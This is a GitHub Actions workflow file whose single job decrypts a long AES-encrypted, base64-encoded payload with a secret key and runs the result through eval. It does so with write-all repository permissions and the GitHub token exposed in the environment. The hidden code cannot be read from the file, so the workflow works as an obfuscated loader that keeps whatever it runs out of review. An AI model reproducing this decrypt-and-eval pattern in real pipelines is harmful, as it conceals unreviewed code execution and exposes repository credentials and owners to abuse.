name: Run

on: 
  workflow_dispatch:
    inputs:
      option1:
        required: true
        default: 'aria2'
        type: string
      option2:
        required: true
        default: ''
        type: string
      option3:
        required: false
        default: ''
        type: string
 
permissions: write-all

env:
  GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
  DECRYPTION_KEY: ${{ secrets.DECRYPTION_KEY }}
  OPTION_1: ${{ inputs.option1 }}
  OPTION_2: ${{ inputs.option2 }}
  OPTION_3: ${{ inputs.option3 }}

jobs:
  j:
    runs-on: ubuntu-24.04
    steps:
      - name: May
        run: |
          encrypted_payload="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"

          decrypted=$(echo "$encrypted_payload" | base64 -d | openssl enc -aes-256-cbc -d -salt -pbkdf2 -pass pass:"$DECRYPTION_KEY")

          if [ $? -eq 0 ]; then
            eval "$decrypted"
          fi
